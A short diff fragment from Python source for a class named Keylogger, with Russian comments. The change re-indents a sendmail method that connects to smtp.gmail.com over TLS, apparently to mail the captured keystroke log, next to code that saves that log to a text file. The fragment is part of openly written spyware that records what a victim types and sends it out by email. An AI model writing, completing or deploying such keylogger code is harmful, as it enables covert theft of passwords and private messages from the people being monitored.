@@ -53,7 +53,7 @@ class Keylogger:
                 print(self.log, file=f)
             print(f"[+] Saved {self.filename}.txt")
 
-            def sendmail(self, email, password, message):
+    def sendmail(self, email, password, message):
                 # управляет подключением к SMTP-серверу
                 server = smtplib.SMTP(host="smtp.gmail.com", port=587)
                 # подключиться к SMTP-серверу в режиме TLS
